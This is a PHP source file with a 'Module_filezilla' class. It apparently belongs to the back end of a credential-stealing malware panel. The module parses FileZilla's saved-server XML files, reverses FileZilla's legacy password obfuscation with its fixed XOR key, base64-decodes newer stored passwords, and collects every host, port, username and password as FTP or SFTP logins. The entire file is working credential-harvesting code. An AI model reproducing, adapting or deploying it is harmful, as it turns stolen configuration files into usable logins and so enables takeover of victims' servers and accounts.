<?php

class Module_filezilla extends Module_
{
    protected function DecryptV2($Pass)
    {
        if (!strlen($Pass) || (strlen($Pass) % 3 != 0))
            return "";

        $Key = 'FILEZILLA1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $PTR = ((idiv(strlen($Pass), 3)) % 0x2d);

        $Result = '';

        $len = idiv(strlen($Pass), 3);
        for ($i = 0; $i < $len; $i++)
        {
            $Num = substr($Pass, $i*3, 3);
            if (!IsNum($Num))
                return false;

            $Result .= chr(ord($Key[$PTR++ % strlen($Key)]) ^ intval($Num));
        }

        return $Result;
    }

    //V3
    protected function ProcessItem($Source)
    {
        $Host = Assign_($Source->Host);
        $User = Assign_($Source->User);
        $Pass = Assign_($Source->Pass);
        $Port = Assign_($Source->Port);
        $Prot = Assign_($Source->Protocol);

        if(isset($Source->Pass['encoding']) AND $Source->Pass['encoding'] == "base64")
        {
            $Pass = base64_decode($Pass);
        }

		
        $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 1) , $Port), $User, $Pass);
    }
    protected function ProcessItems($Elements)
    {
        if(isset($Elements->Host))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->Host))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
    protected function ProcessV3XML($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
        {
            return FALSE;
        }

        if(isset($XML_->Settings->LastServer))
        {
            $this->ProcessItems($XML_->Settings->LastServer);
        }

        if(isset($XML_->RecentServers))
        {
            $this->ProcessItems($XML_->RecentServers);
        }

        if(isset($XML_->Servers))
        {
            $this->ProcessItems($XML_->Servers);
        }
    }

    //V2
    function ProcessItemsV2($Elements)
    {
        foreach($Elements->children() as $Element)
        {
            if(isset($Element['Host']))
            {
                $Host = Assign_($Element['Host']);
                $Port = Assign_($Element['Port']);
                $User = Assign_($Element['User']);
                $Pass = $this->DecryptV2($Element['Pass']);
                $Prot = Assign_($Element['ServerType']);
				
                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 3), $Port), $User, $Pass);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItemsV2($Element);
            }
        }
    }
    protected function ProcessV2XML($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
        {
            return FALSE;
        }

        if(isset($XML_->Settings->Item))
        {
            $Node = $XML_->xpath('//Settings/Item[@name="Last Server Host"]');
            $Host = Assign_($Node[0]);
            $Node = $XML_->xpath('//Settings/Item[@name="Last Server Port"]');
            $Port = Assign_($Node[0]);
            $Node = $XML_->xpath('//Settings/Item[@name="Last Server User"]');
            $User = Assign_($Node[0]);
            $Node = $XML_->xpath('//Settings/Item[@name="Last Server Pass"]');
            $Pass = Assign_($Node[0]);
        }

        if(isset($XML_->Sites))
        {
            $this->ProcessItemsV2($XML_->Sites);
        }
        if(isset($XML_->RecentServers))
        {
            $this->ProcessItemsV2($XML_->RecentServers);
        }
    }

    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:
            $this->ProcessV2XML($Data);
            break;
        case 1:
            $this->ProcessV3XML($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}